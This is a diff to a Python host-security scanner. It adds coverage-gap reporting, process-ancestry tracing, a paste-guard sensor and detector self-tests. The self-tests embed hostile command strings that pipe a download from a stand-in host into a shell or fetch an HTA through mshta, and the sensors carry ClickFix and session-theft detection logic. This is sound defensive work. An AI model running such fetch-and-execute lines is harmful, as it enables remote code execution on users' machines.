@@ -11831,7 +12243,8 @@ def snapshot_agent_skills():
     for root in AGENT_SKILL_ROOTS:
         try:
             names = sorted(os.listdir(root))
-        except Exception:
+        except Exception as e:
+            unexamined(root, "could not be listed", e)
             continue
         label = os.path.basename(root.rstrip("/")) or root
         for name in names:
@@ -12707,10 +13120,19 @@ def _credential_path_tokens():
 
 AGENT_CONFIG_ROOTS = [os.path.join(HOME, d) for d in (
     ".claude", ".codex", ".cursor", ".gemini", ".continue", ".aider",
+    ".copilot", ".hermes", ".codeium/windsurf", ".config/opencode",
+    ".config/zed",
     "Library/Application Support/Claude",
     "Library/Application Support/Code/User",
-    ".config/claude", ".config/Code/User",
+    ".config/claude", ".config/Claude", ".config/Code/User",
+    "AppData/Roaming/Claude", "AppData/Roaming/Code/User",
 )]
+
+# Registries that live as a single file OUTSIDE any agent directory, so no
+# root walk reaches them. ~/.claude.json is Claude Code's user-level
+# `mcpServers` store — the primary MCP registration on this machine — and it
+# sits in $HOME itself, a root nothing here may walk.
+AGENT_CONFIG_FILES = [os.path.join(HOME, f) for f in (".claude.json",)]
 
 # Instruction files: natural language that an agent treats as standing orders.
 AGENT_INSTRUCTION_NAMES = (
@@ -14400,7 +14822,8 @@ def _agent_repo_roots():
     for raw in cand:
         try:
             r = os.path.realpath(os.path.expanduser(raw))
-        except Exception:
+        except Exception as e:
+            unexamined(raw, "its path could not be resolved", e)
             continue
         if r in seen:
             continue
@@ -14471,6 +14894,10 @@ def _agent_config_files():
         _AGENT_SCAN_TRUNCATED[0] = True
         if root not in _AGENT_SCAN_TRUNCATED_ROOTS:
             _AGENT_SCAN_TRUNCATED_ROOTS.append(root)
+
+    for p in AGENT_CONFIG_FILES:
+        if os.path.isfile(p) and not os.path.islink(p):
+            seen.append(p)
 
     # A root refused by the ROOT cap was not partially walked, it was never
     # opened — indistinguishable from clean unless it is named, which is the
@@ -14548,8 +14975,94 @@ def check_agent_surface_coverage():
         truncated_roots=cut)]
 
 
+def check_coverage():
+    """Every gap the scan's sensors recorded, as findings the operator can judge.
+
+    One finding per sensor that found items it could not examine (the
+    unexamined() ledger), plus the agent-surface truncation report. Collected
+    LAST in _cmd_scan_locked, after every sensor and surface has run, because
+    the ledger is only complete then.
+
+    Fingerprinted on the sensor and the SET of gap KINDS ("larger than the
+    read cap", "is not parseable JSON", "could not be listed"...), not on the
+    subjects. The first live install reported 121 agent-surface items: session
+    transcripts past the read cap and telemetry that is JSONL under a .json
+    name. Those files churn every hour, and a fingerprint on the subject set
+    would have re-alerted a MEDIUM on every scan -- the volume-defeats-discount
+    shape the risk tier had to be taught out of. What the operator judges is
+    "this sensor has a blind spot of this KIND"; a new kind (a permission
+    denial appearing where there was only oversize) is a new fact and
+    re-alerts; another file of a known kind is the same fact, and the
+    incident's last_seen and this detail carry the current count and
+    examples. `absent` and `privileged` gaps never reach here -- a thing that
+    is not there cannot be examined, a wall the design forbids crossing is not
+    a fault, and churn is not coverage loss."""
+    out = list(check_agent_surface_coverage())
+    for sid in sorted(_UNEXAMINED):
+        if sid == "(direct)":
+            continue
+        gaps = _gaps(sid)
+        if not gaps:
+            continue
+        subjects = sorted(set(s for s, _w in gaps))
+        kinds = sorted(set(_gap_kind(w) for _s, w in gaps))
+        shown = ["%s (%s)" % (s.replace(HOME, "~"), w)
+                 for s, w in sorted(gaps)[:6]]
+        more = len(gaps) - len(shown)
+        exec_surface = sid in _EXEC_REGISTERING_SENSORS
+        out.append(finding(
+            "MEDIUM" if exec_surface else "LOW", "coverage",
+            "Sensor found items it could not examine: %s" % sid,
+            "%s located %d item(s) and could not read or parse them, so what "
+            "they hold is UNKNOWN, not clean%s. Kind(s): %s. Examples: %s%s. "
+            "This is digest-routed (below the incident floor) and re-appears "
+            "only when a new KIND of gap shows up; fix the read (permission, "
+            "size, syntax) to clear it."
+            % (sid, len(gaps),
+               (" -- and this surface registers what RUNS, so an entry the "
+                "operator cannot see may be one that executes")
+               if exec_surface else "",
+               "; ".join(kinds), "; ".join(shown),
+               " (+%d more)" % more if more > 0 else ""),
+            "coverage:unexamined:%s:%s"
+            % (sid, hashlib.sha256("|".join(kinds).encode("utf-8", "replace"))
+               .hexdigest()[:12]),
+            confidence="high", markers=["coverage", sid],
+            sensor=sid, kinds=kinds, unexamined=subjects[:32]))
+    return out
+
+
 _AGENT_SCAN_TRUNCATED = [False]     # set by _agent_config_files, read by health
 _AGENT_SCAN_TRUNCATED_ROOTS = []    # WHICH roots were cut short, same writer
+
+
+_JSONC_TOKEN_RE = re.compile(
+    r'"(?:\\.|[^"\\])*"'          # a string, kept verbatim
+    r"|//[^\n]*"                    # a line comment
+    r"|/\*.*?\*/",                  # a block comment
+    re.S)
+_JSONC_TRAILING_COMMA_RE = re.compile(r",(\s*[}\]])")
+
+
+def _loads_jsonc(text):
+    """json.loads, then a JSONC retry: comments and trailing commas removed
+    OUTSIDE string literals.
+
+    VS Code, Cursor and Zed write JSON-with-comments, and VS Code's
+    settings.json is where `mcp.servers` (an exec registration) lives. Strict
+    parsing recorded that file as "is not parseable JSON" on the reference
+    machine -- i.e. the surface had never once read the one editor config most
+    likely to carry a server command. A file that still fails after the
+    lenient pass raises like before, so a truncated or hostile config is still
+    a recorded gap, not a clean read."""
+    try:
+        return json.loads(text)
+    except ValueError:
+        pass
+    stripped = _JSONC_TOKEN_RE.sub(
+        lambda m: m.group(0) if m.group(0).startswith('"') else " ", text)
+    stripped = _JSONC_TRAILING_COMMA_RE.sub(r"\1", stripped)
+    return json.loads(stripped)
 
 
 def snapshot_agent_surface():
@@ -14564,18 +15077,28 @@ def snapshot_agent_surface():
     for p in _agent_config_files():
         try:
             if os.path.getsize(p) > _AGENT_TEXT_CAP:
+                unexamined(p, "larger than the %d-byte read cap"
+                           % _AGENT_TEXT_CAP)
                 continue
-        except Exception:
+        except Exception as e:
+            unexamined(p, "could not be stat'd: %s" % str(e)[:80], e)
             continue
         text = _read_text(p, limit=_AGENT_TEXT_CAP)
         if text is None:
+            unexamined(p, "could not be read")
             continue
         rec = {"sha256": hashlib.sha256(text.encode("utf-8", "replace")).hexdigest()}
         entries = []
         if p.endswith(".json"):
             try:
-                entries = _agent_exec_entries(json.loads(text))
-            except Exception:
+                entries = _agent_exec_entries(_loads_jsonc(text))
+            except Exception as e:
+                # NOT the same as "this config declares no exec entries",
+                # which is what an empty list means everywhere else here. A
+                # truncated, mid-write or deliberately-malformed config took
+                # the clean branch and its exec registrations went unexamined
+                # and unreported.
+                unexamined(p, "is not parseable JSON: %s" % str(e)[:80], e)
                 entries = []
         elif p.endswith(".toml"):
             entries = _toml_exec_entries(text)
@@ -15010,7 +15533,7 @@ def check_browser_automation():
     try:
         procs = list(_iter_processes())
     except Exception:
-        return findings
+        return None            # no process table is no answer, not "no theft"
     own = _own_owner()
     for pid, owner, exe, argv in procs:
         try:
@@ -15066,7 +15589,9 @@ def check_browser_automation():
                     "session-theft:automation-scratch:%s" % os.path.basename(exe),
                     pid=pid, program=exe, confidence="low",
                     markers=["browser-automation"]))
-        except Exception:
+        except Exception as e:
+            unexamined("pid %s" % pid, "its command line could not be "
+                       "examined: %s" % e, e)
             continue
     return findings
 
@@ -15089,7 +15614,8 @@ def snapshot_session_binding():
             continue
         try:
             data = json.loads(text)
-        except Exception:
+        except Exception as e:
+            unexamined(ls, "is not parseable JSON", e)
             continue
         osc = data.get("os_crypt") or {}
         snap[root] = {
@@ -15564,7 +16090,8 @@ def snapshot_git_hooks():
         hooks = {}
         try:
             names = sorted(os.listdir(hooks_dir))
-        except Exception:
+        except Exception as e:
+            unexamined(hooks_dir, "could not be listed", e)
             names = []
         for name in names:
             # `.sample` is what git ships in every clone: inert by extension,
@@ -16048,9 +16575,15 @@ def check_self_protection():
     prev = st.get("findings_size")
     try:
         cur_size = os.path.getsize(FINDINGS_LOG)
-    except Exception:
-        cur_size = 0
-    if isinstance(prev, int) and cur_size < prev:
+    except FileNotFoundError:
+        cur_size = 0            # gone is the strongest form of "shrank"
+    except Exception as e:
+        # Unreadable is not "zero bytes". A size this scan could not take is
+        # a gap in the tamper check, not evidence of tampering -- and the old
+        # branch alerted HIGH "truncated" on exactly that.
+        unexamined(FINDINGS_LOG, "its size could not be read: %s" % e, e)
+        cur_size = None
+    if isinstance(prev, int) and cur_size is not None and cur_size < prev:
         findings.append(finding(
             "HIGH", "self-protection", "Findings log was truncated",
             "%s shrank from %d to %d bytes since the last scan — the append-only "
@@ -16337,7 +16870,7 @@ def _scan_surfaces(baseline, corrupt, first_run, health=None):
             _surface_row(row)
         started = time.monotonic()
         try:
-            cur = snap_fn()
+            cur = _run_as_sensor("surface." + key, snap_fn)
             if cur is SURFACE_PRIVILEGED:
                 # OS-imposed privilege wall: a named permanent coverage gap,
                 # not a broken sensor. Never diffed, never adopted, never
@@ -16350,7 +16883,7 @@ def _scan_surfaces(baseline, corrupt, first_run, health=None):
                 status = "DEGRADED"
                 detail = "sensor returned no reliable snapshot"
             else:
-                status, detail = "OK", ""
+                status, detail = "OK", _coverage_note("surface." + key)
         except Exception as e:
             cur = None
             status, detail = "FAILED", str(e)
@@ -16506,6 +17039,7 @@ def gather_all(baseline_snap, current_snap, health=None):
         # scan behaviour — the opt-in is the arming, not a config flag.
         ("latch", check_latches, ()),
         ("decoy", check_decoys, ()),
+        ("paste-guard", check_paste_guard, ()),
         ("assay", check_assay, ()),
         ("outbound", check_outbound, ()),
         ("web-protection", check_web_protection, ()),
@@ -17200,7 +17734,9 @@ def _cmd_scan_locked(quiet=False):
     _SIG_PROBE_FAILURES = 0
     _PROC_ENUM_FAILED = False
     _PROC_ARGV_PARTIAL = False
+    _reset_unexamined()
     health = []
+    scan_started, cpu_started = time.monotonic(), _cpu_seconds()
     baseline, baseline_corrupt = load_baseline()
     first_run = baseline is None and not baseline_corrupt
     current = _collect_sensor("persistence.snapshot", snapshot_persistence,
@@ -17216,13 +17752,13 @@ def _cmd_scan_locked(quiet=False):
                                                 first_run, health=health)
     findings += surface_findings
 
-    # Agent-surface coverage is read HERE, after _scan_surfaces has run the
-    # agent-surface walk that sets _AGENT_SCAN_TRUNCATED — not as a gather_all
-    # sensor, which runs before the walk and so always saw a stale flag (missing
-    # every truncation on a one-shot scan). Collected via _collect_sensor to keep
-    # its sensor-health entry identical to the other sensors.
-    findings += _collect_sensor("agent-surface-coverage",
-                                check_agent_surface_coverage, health)
+    # Coverage is read HERE, after every sensor and surface has run and written
+    # to the ledger, and after the agent-surface walk has set
+    # _AGENT_SCAN_TRUNCATED — not as a gather_all sensor, which runs before the
+    # surfaces and so always saw a stale flag (missing every truncation on a
+    # one-shot scan). Collected via _collect_sensor to keep its sensor-health
+    # entry identical to the other sensors.
+    findings += _collect_sensor("coverage", check_coverage, health)
 
     if baseline_corrupt:
         # Do not silently re-baseline. Surface it loudly and let every current
@@ -17310,6 +17846,12 @@ def _cmd_scan_locked(quiet=False):
                    "were NOT vouched for" % _SIG_PROBE_FAILURES)
         if _SIG_PROBE_FAILURES else "",
         "duration_ms": 0, "item_count": _SIG_PROBE_FAILURES})
+    # The scan's own cost, recorded where every other coverage fact is so it
+    # is durable per scan. duration_ms is wall time; item_count is CPU
+    # milliseconds for this process AND every command it waited on.
+    health.append({"sensor_id": "scan.cost", "status": "OK", "detail": "",
+                   "duration_ms": int((time.monotonic() - scan_started) * 1000),
+                   "item_count": int((_cpu_seconds() - cpu_started) * 1000)})
 
     # Captured BEFORE emit, which is what updates the ledger: this is the set
     # the previous scan had already reported, and the difference against it is
@@ -18780,6 +19322,19 @@ def cmd_doctor():
     print("  %s %-27s %s" % (a_mark, "positive controls", a_text))
     if a_mark != "✓":
         problems.append("assay coverage")
+    cost = _scan_cost_summary(_scan_cost_samples())
+    if cost is None:
+        print("  · %-27s no history yet (two scans needed)" % "scan cost")
+    else:
+        over = cost["share_pct"] > SCAN_CPU_CEILING_PCT
+        print("  %s %-27s cpu %.1fs/scan, wall p50 %.1fs p95 %.1fs, %.2f%% of "
+              "the last %.1fh over %d scans (ceiling %.0f%%)"
+              % ("?" if over else "✓", "scan cost", cost["cpu_mean_s"],
+                 cost["wall_p50_s"], cost["wall_p95_s"], cost["share_pct"],
+                 cost["span_h"], cost["scans"], SCAN_CPU_CEILING_PCT))
+        if over:
+            problems.append("scan cost")
+
     # --- liveness -----------------------------------------------------------
     # doctor contained no read_heartbeat() call at all. The beat is the signal
     # every OTHER watcher on this machine keys on — `aegis.py watchdog`, the
@@ -20942,8 +21497,15 @@ def _process_start_token(pid):
     if IS_WIN:
         script = ("$p=Get-CimInstance Win32_Process -Filter 'ProcessId = %d' "
                   "-ErrorAction SilentlyContinue;if($p){$p.CreationDate}" % pid)
+        # 15s was BELOW the measured cold start, so on a cold interpreter this
+        # could not return in time by construction. It fails closed --
+        # _process_matches() reads a None token as PID reuse and refuses -- so
+        # the cost was not a wrong action but no action: every response bound to
+        # this token would decline, on exactly the cold machine where the first
+        # action after boot happens.
         out, _, rc = run(["powershell", "-NoProfile", "-NonInteractive",
-                          "-Command", script], timeout=15)
+                          "-Command", script],
+                         timeout=WIN_PS_COLD_START_CEILING)
     else:
         out, _, rc = run(["ps", "-o", "lstart=", "-p", str(pid)], timeout=10)
     token = (out or "").strip()
@@ -21369,6 +21931,137 @@ def _iter_parents():
 _WIN_PPID_PS = (
     "$t=[char]9;Get-CimInstance Win32_Process | ForEach-Object {"
     "(($_.ProcessId),($_.ParentProcessId)) -join $t}")
+
+_WIN_ANCESTRY_PS = (
+    "$t=[char]9;Get-CimInstance Win32_Process | ForEach-Object {"
+    "(($_.ProcessId),($_.ParentProcessId),($_.CreationDate)) -join $t}")
+
+# Ancestry walk bound. Eight parents reaches the login session from any
+# interactive shell; past that the chain is init and says nothing new.
+ANCESTRY_MAX_DEPTH = 8
+
+
+def _parse_ps_ancestry(text):
+    """{pid: (ppid, lstart)} from `ps -axo pid=,ppid=,lstart=`. lstart is the
+    remainder of the line — a multi-word date, so it cannot be split on
+    whitespace like the two numeric columns before it."""
+    out = {}
+    for line in (text or "").splitlines():
+        parts = line.split(None, 2)
+        if len(parts) == 3 and parts[0].isdigit():
+            out[parts[0]] = (parts[1], parts[2].strip())
+    return out
+
+
+def _process_ancestry_table():
+    """{pid: (ppid, start)} for every visible process, one call per platform.
+
+    `start` is the creation token _process_start_token reads per pid, carried
+    for the whole table so a walk can refuse a parent that started AFTER its
+    child: a bare ppid is a reusable slot, and the slot's current occupant is
+    not necessarily the process that forked this one."""
+    out = {}
+    if IS_LINUX:
+        try:
+            pids = [d for d in os.listdir("/proc") if d.isdigit()]
+        except Exception as e:
+            unexamined("process ancestry", "/proc could not be listed", e)
+            return out
+        for pid in pids:
+            try:
+                with open("/proc/%s/stat" % pid, encoding="utf-8",
+                          errors="replace") as f:
+                    data = f.read()
+            except Exception as e:
+                unexamined("pid %s" % pid, "its /proc stat could not be read", e)
+                continue
+            tail = data[data.rfind(")") + 1:].split()
+            if len(tail) > 19:
+                out[pid] = (tail[1], tail[19])          # ppid, starttime
+        return out
+    if IS_WIN:
+        o, _e, rc = run(["powershell", "-NoProfile", "-NonInteractive",
+                         "-Command", _WIN_ANCESTRY_PS], timeout=120)
+        if rc != 0 or not o:
+            unexamined("process ancestry",
+                       "the CIM parent-pid query failed (rc=%s)" % rc)
+            return out
+        for line in o.splitlines():
+            parts = line.rstrip("\r").split("\t")
+            if len(parts) >= 3 and parts[0].strip().isdigit():
+                out[parts[0].strip()] = (parts[1].strip(), parts[2].strip())
+        return out
+    o, _e, rc = run(["ps", "-axo", "pid=,ppid=,lstart="], timeout=15)
+    if rc != 0:
+        unexamined("process ancestry",
+                   "the ps parent-pid query failed (rc=%s)" % rc)
+        return out
+    return _parse_ps_ancestry(o)
+
+
+def _start_epoch(token):
+    """A comparable number from a start token, or None. Linux starttime is
+    jiffies since boot (a number already); macOS lstart is
+    'Tue Sep  2 10:00:00 2026'. Windows CreationDate is locale-formatted and
+    is left unparsed, so the reuse check does not run there — stated, not
+    hidden."""
+    if token is None:
+        return None
+    tok = str(token).strip()
+    if tok.isdigit():
+        return float(tok)
+    try:
+        return time.mktime(time.strptime(tok, "%a %b %d %H:%M:%S %Y"))
+    except (ValueError, OverflowError):
+        return None
+
+
+def _ancestry(pid, table, depth=ANCESTRY_MAX_DEPTH):
+    """[ppid, grandparent, ...] up the chain from `pid`, at most `depth` long.
+
+    Keyed on (pid, start) rather than pid alone: the walk stops at a parent
+    whose start is LATER than its child's, because that slot has been re-used
+    and whoever holds it now did not fork this process. A parent missing from
+    the table (the kernel, another user's process) ends the chain."""
+    chain, seen = [], {str(pid)}
+    cur = str(pid)
+    while len(chain) < depth and cur in table:
+        ppid, start = table[cur]
+        ppid = str(ppid or "")
+        if ppid not in table or ppid in seen:
+            break
+        child_t, parent_t = _start_epoch(start), _start_epoch(table[ppid][1])
+        if child_t is not None and parent_t is not None and parent_t > child_t:
+            break
+        chain.append(ppid)
+        seen.add(ppid)
+        cur = ppid
+    return chain
+
+
+def _annotate_ancestry(findings):
+    """Attach 'spawned by' lineage to process findings. Enrichment only —
+    never a new alert — and computed once per call, because a behavior
+    finding is rare and the table costs one process-table read."""
+    if not any(f.get("pid") for f in findings):
+        return
+    try:
+        table = _process_ancestry_table()
+        names = {}
+        for p, _o, exe, argv in _iter_processes():
+            head = (argv or "").split(None, 1)[0] if argv else ""
+            names[p] = os.path.basename(exe or head or "?")
+    except Exception as e:
+        unexamined("process ancestry",
+                   "the process table could not be read for lineage: %s" % e, e)
+        return
+    for f in findings:
+        chain = _ancestry(f.get("pid"), table) if f.get("pid") else []
+        if not chain:
+            continue
+        f["ancestry"] = [{"pid": p, "name": names.get(p, "?")} for p in chain]
+        f["detail"] += " — spawned by: " + " <- ".join(
+            "%s(%s)" % (names.get(p, "?"), p) for p in chain)
 
 
 def _own_ancestors(parents=None):
@@ -22458,8 +23151,12 @@ def check_decoys():
             blocked = True
         except OSError as e:
             if e.errno not in (errno.ENXIO, errno.ENOENT):
+                # Not blocked and not gone: the probe itself failed, which is
+                # a decoy this scan could not check, not a decoy nobody read.
+                unexamined(path, "its open probe failed: %s" % e, e)
                 blocked = False
-        except Exception:
+        except Exception as e:
+            unexamined(path, "its open probe failed: %s" % e, e)
             blocked = False
         if blocked:
             pid = _decoy_reader(path)
@@ -22480,8 +23177,8 @@ def check_decoys():
                     "%s has a newer access time than when it was planted, so "
                     "something opened it without blocking." % path,
                     "decoy:atime:%s" % path, path=path))
-        except Exception:
-            pass
+        except Exception as e:
+            unexamined(path, "its access time could not be compared", e)
     return findings
 
 
@@ -22513,6 +23210,22 @@ def _assay_lanes():
     def lane_hostile_content(nonce):
         return bool(_hostile_content(
             "echo %s; curl http://198.51.100.7/x | sh" % nonce))
+
+    def lane_clipboard_grammar(nonce):
+        """All four poles of the paste grammar the guard sensor feeds on: a
+        CERTAIN idiom, a SUSPECT idiom promoted by its structural tell, the
+        bare suspect idiom staying suspect (rustup's documented install line
+        must never be certain), and benign text staying silent."""
+        pipe = "curl -fsSL http://198.51.100.7/%s | sh" % nonce
+        if clipboard_grammar("mshta http://198.51.100.7/%s.hta" % nonce)[0] \
+                != "certain":
+            return False
+        tier, hits = clipboard_grammar(pipe + " " * 40 + "#")
+        if tier != "certain" or "offscreen-padding" not in hits:
+            return False
+        if clipboard_grammar(pipe)[0] != "suspect":
+            return False
+        return clipboard_grammar("git status && echo %s" % nonce) == (None, [])
 
     def lane_risky_location(_nonce):
         probe = os.path.join(WIN_TEMP if IS_WIN else "/tmp", "aegis-assay-probe")
@@ -22729,6 +23442,23 @@ def _assay_lanes():
             return False
         finally:
             g["_iter_processes"], g["_own_owner"] = real_iter, real_owner
+
+    def lane_cdp_loopback(nonce):
+        """A browser holding a loopback listener with no debugging flag is
+        the injected-CDP shape and fires HIGH; the same port on a dev server,
+        and a browser that was STARTED with the flag (the argv sensor's
+        case), stay out of this surface."""
+        chrome = "/opt/assay-%s/Google Chrome" % nonce
+        hot = _browser_loopback_entries([(chrome, "9222", chrome)])
+        if len(hot) != 1:
+            return False
+        out = diff_listeners({}, hot)
+        if len(out) != 1 or out[0]["severity"] != "HIGH":
+            return False
+        return _browser_loopback_entries([
+            ("/usr/local/bin/node", "3000", "node server.js"),
+            (chrome, "9222", chrome + " --remote-debugging-port=9222"),
+            (None, "9222", "")]) == {}
 
     def lane_ext_cap_gain(_nonce):
         """An extension GAINING a session-reaching capability is reported;
@@ -23084,6 +23814,9 @@ def _assay_lanes():
          lane_agent_exec_target),
         ("session-theft", "live-profile browser automation still scores CRITICAL",
          lane_session_theft),
+        ("cdp-loopback",
+         "browser loopback listener without the flag fires; dev server and "
+         "flagged browser stay silent", lane_cdp_loopback),
         ("ext-cap-gain", "extension capability GAIN fires, steady state does not",
          lane_ext_cap_gain),
         ("glean-atoms", "retro-hunt still requires >=3 atoms and ALL of them",
@@ -23107,6 +23840,9 @@ def _assay_lanes():
          lane_sysmon_scoring),
         ("hostile-content", "shell-content grammar still matches",
          lane_hostile_content),
+        ("clipboard-grammar",
+         "paste grammar: certain fires, padding promotes, suspect stays, "
+         "benign is silent", lane_clipboard_grammar),
         ("risky-location", "volatile exec dirs still rate as risky",
          lane_risky_location),
         ("severity-scale", "vendor-label impersonation still rates HIGH+",
@@ -25762,6 +26498,107 @@ def _guard_paths():
             os.path.join(GUARD_DIR, "guard.bash"))
 
 
+def _guard_cursor_path():
+    return os.path.join(GUARD_DIR, "cursor.json")
+
+
+def _paste_guard_finding(rec):
+    """One guard observation -> one finding, or None for a row that carries no
+    verdict. Severity follows the clipboard tiers; confidence follows paste
+    provenance, which is the tri-state `guard observe` recorded (zsh proves a
+    paste, bash cannot, and unknown is never rendered as typed)."""
+    if not isinstance(rec, dict):
+        return None
+    cmd = str(rec.get("cmd") or "")
+    tier, pasted = rec.get("tier"), rec.get("pasted")
+    names = sorted(set(list(rec.get("hits") or []) +
+                       list(rec.get("hostile") or [])))
+    if not cmd or (not tier and not names):
+        return None
+    if tier == "certain":
+        sev, conf = "HIGH", ("high" if pasted else "medium")
+    elif pasted is True:
+        sev, conf = "MEDIUM", "medium"
+    else:
+        # Typed by hand, or a shell that cannot tell: `curl … | sh` is how
+        # rustup is documented, so without paste provenance this is a digest
+        # line, not an interrupt.
+        sev, conf = "LOW", "low"
+    how = {True: "was PASTED into", False: "was typed into"}.get(
+        pasted, "ran in (paste provenance unknown)")
+    program = cmd.split(None, 1)[0] if cmd else ""
+    return finding(
+        sev, "paste-guard",
+        "Hostile command line %s a shell"
+        % ("pasted into" if pasted else "ran in"),
+        "A command matching [%s] %s an interactive shell at %s: %s"
+        % (", ".join(names), how, rec.get("ts") or "?",
+           re.sub(r"\s+", " ", cmd)[:200]),
+        "paste-guard:%s:%s" % (tier or "hostile",
+                               hashlib.sha256(cmd.encode()).hexdigest()[:16]),
+        program=program, pasted=pasted, tier=tier, observed_at=rec.get("ts"),
+        markers=["paste-guard"] + names, confidence=conf)
+
+
+def check_paste_guard():
+    """Sensor: what the shell guard observed since the last scan.
+
+    `guard observe` already runs clipboard_grammar over every executed command
+    line with paste provenance attached — the ClickFix shape at the moment it
+    executes — but its log was only ever read by `guard status`. This reads it
+    into the scan, so a pasted hostile line is an incident with correlation
+    and a health row, not a number the operator has to remember to ask for.
+
+    Returns [] when the hook was never installed (absent, not degraded), None
+    when it is installed but its log cannot be read. The cursor is a byte
+    offset and nothing else: the log itself holds only hostile lines, and a
+    clean command line never reaches it."""
+    zsh_p, bash_p = _guard_paths()
+    if not (os.path.isfile(zsh_p) or os.path.isfile(bash_p)):
+        return []
+    cursor = load_json(_guard_cursor_path(), None)
+    try:
+        size = os.path.getsize(GUARD_LOG)
+    except FileNotFoundError:
+        if not isinstance(cursor, dict):
+            save_json(_guard_cursor_path(), {"offset": 0})
+        return []
+    except OSError:
+        return None
+    if not isinstance(cursor, dict):
+        # An install that predates this sensor: adopt what `guard status` has
+        # already shown the operator rather than re-alerting months of it.
+        save_json(_guard_cursor_path(), {"offset": size})
+        return []
+    offset = int(cursor.get("offset") or 0)
+    if offset > size:
+        offset = 0          # rotated or truncated underneath us
+    try:
+        with open(GUARD_LOG, "rb") as f:
+            f.seek(offset)
+            data = f.read()
+    except OSError:
+        return None
+    # Only whole lines are consumed: a scan racing the hook mid-append must
+    # leave the partial record for the next scan, not skip past it.
+    consumed = data.rfind(b"\n") + 1
+    findings = []
+    for line in data[:consumed].decode("utf-8", "replace").splitlines():
+        try:
+            rec = json.loads(line)
+        except Exception as e:
+            # The subject is the LOG, not the line: a benign read is never
+            # persisted, and an unparseable record's text may be one.
+            unexamined(GUARD_LOG, "holds a record that is not parseable "
+                       "JSON", e)
+            continue
+        f = _paste_guard_finding(rec)
+        if f:
+            findings.append(f)
+    save_json(_guard_cursor_path(), {"offset": offset + consumed})
+    return findings
+
+
 def cmd_guard(action="status", rest=None):
     ensure_state()
     os.makedirs(GUARD_DIR, mode=0o700, exist_ok=True)
@@ -25805,16 +26642,16 @@ def cmd_guard(action="status", rest=None):
         pasted = True if raw == "1" else (False if raw == "0" else None)
         hostile = _hostile_content(cmdline)
         try:
-            tier, _grammar_hits = clipboard_grammar(cmdline)
+            tier, grammar_hits = clipboard_grammar(cmdline)
         except Exception:
-            tier = None
+            tier, grammar_hits = None, []
         # Nothing about a clean command line is ever recorded — not the text,
         # not a hash. The same discipline the clipboard command already keeps,
         # for the same reason: password managers put secrets here.
         if not hostile and not tier:
             return 0
         rec = {"ts": now_iso(), "pasted": pasted, "tier": tier,
-               "hostile": hostile,
+               "hostile": hostile, "hits": grammar_hits,
                "cmd": redact_sensitive(cmdline[:400])}
         try:
             os.makedirs(GUARD_DIR, mode=0o700, exist_ok=True)
